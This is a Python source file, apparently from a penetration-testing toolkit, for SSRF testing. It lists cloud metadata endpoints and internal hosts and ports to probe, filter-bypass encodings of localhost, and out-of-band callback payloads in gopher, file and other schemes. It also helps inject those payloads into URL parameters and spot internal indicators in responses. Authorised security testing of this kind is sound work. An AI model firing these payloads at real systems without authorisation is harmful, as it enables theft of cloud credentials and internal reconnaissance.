"""
SSRF (Server-Side Request Forgery) helper.

Provides:
  - Internal host / IP lists to test for SSRF pivoting
  - Payload generators for common SSRF bypass tricks
  - A helper to launch a Burp Collaborator / interact.sh-style callback host
    (you supply the domain — we just build the payloads around it)
  - Detection of internal-IP indicators in a response body

This module does NOT automatically exploit targets. It builds payloads and
analyses responses you provide.
"""
from __future__ import annotations
import ipaddress
import re
import urllib.parse
from dataclasses import dataclass
from typing import List, Optional


# Cloud metadata endpoints — the high-value SSRF targets
CLOUD_METADATA = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "aws_imdsv2": "http://169.254.169.254/latest/api/token",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
    "digitalocean": "http://169.254.169.254/metadata/v1.json",
    "oracle": "http://169.254.169.254/opc/v2/instance/",
}

# Common internal addresses worth probing
INTERNAL_TARGETS = [
    "127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "[::1]",
    "169.254.169.254",  # link-local metadata
    "metadata.google.internal",
    "10.0.0.1", "10.0.0.2", "192.168.0.1", "192.168.1.1",
    "172.16.0.1", "172.17.0.1",  # docker host
]

INTERNAL_PORT_SCAN_DEFAULT = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

# Bypass tricks for filters that block "127.0.0.1" / "localhost"
BYPASS_ENCODINGS = {
    "decimal": "2130706433",          # 127.0.0.1 -> int
    "octal": "0177.0.0.1",
    "hex": "0x7f.0x0.0x0.0x1",
    "ipv6": "[::ffff:127.0.0.1]",
    "short": "127.1",
    "zero": "0.0.0.0",
    "cidr": "127.0.0.1/32",
    "dns_rebind_hint": "localtest.me",  # resolves to 127.0.0.1
}


@dataclass
class SsrfPayload:
    payload: str
    technique: str
    target: str


def _is_private_ip(host: str) -> bool:
    """Return True if host is a private/loopback/link-local IP."""
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        return False


class SsrfHelper:
    """Build SSRF payloads and analyse responses for internal indicators."""

    def metadata_payloads(self) -> List[SsrfPayload]:
        """Payloads targeting cloud metadata services."""
        out: List[SsrfPayload] = []
        for cloud, url in CLOUD_METADATA.items():
            out.append(SsrfPayload(url, "metadata", cloud))
        return out

    def internal_targets(self) -> List[str]:
        return list(INTERNAL_TARGETS)

    def bypass_payloads(self, target: str = "http://127.0.0.1/") -> List[SsrfPayload]:
        """Generate filter-bypass variants of a target URL."""
        out: List[SsrfPayload] = [SsrfPayload(target, "plain", target)]
        host = "127.0.0.1"
        for name, val in BYPASS_ENCODINGS.items():
            replaced = target.replace("127.0.0.1", val)
            out.append(SsrfPayload(replaced, f"bypass:{name}", val))
        return out

    def callback_payloads(self, callback_host: str) -> List[SsrfPayload]:
        """
        Build payloads pointing to an out-of-band callback host
        (e.g. your interact.sh / Burp Collaborator domain) to confirm SSRF.
        """
        schemes = ["http", "https", "gopher", "file", "dict", "ftp"]
        out: List[SsrfPayload] = []
        for s in schemes:
            out.append(SsrfPayload(f"{s}://{callback_host}/", f"oob:{s}", callback_host))
        # URL with creds to also capture in callback logs
        out.append(SsrfPayload(f"http://bugforge@{callback_host}/", "oob:creds", callback_host))
        return out

    def detect_internal_indicators(self, body: str) -> List[str]:
        """
        Scan a response body for signs that an internal resource was fetched:
        private IPs, internal hostnames, cloud metadata content.
        """
        indicators: List[str] = []
        # IPv4
        for m in re.finditer(r"\b(\d{1,3}\.){3}\d{1,3}\b", body):
            ip = m.group(0)
            if _is_private_ip(ip):
                indicators.append(f"private_ip:{ip}")
        # Internal hostnames
        for m in re.finditer(r"\b(localhost|.*\.internal|.*\.local|metadata\..*)\b", body):
            indicators.append(f"internal_host:{m.group(0)}")
        # Cloud metadata give-aways
        for kw in ["ami-id", "instance-id", "security-credentials",
                   "computeMetadata", "imds", "placement/"]:
            if kw.lower() in body.lower():
                indicators.append(f"metadata_content:{kw}")
        return indicators

    def build_url(self, base: str, param: str, payload_value: str) -> str:
        """Inject a payload value into a URL parameter."""
        parsed = urllib.parse.urlparse(base)
        qs = urllib.parse.parse_qsl(parsed.query)
        qs = [(k, payload_value) if k == param else (k, v) for k, v in qs]
        if not any(k == param for k, _ in qs):
            qs.append((param, payload_value))
        new_query = urllib.parse.urlencode(qs)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
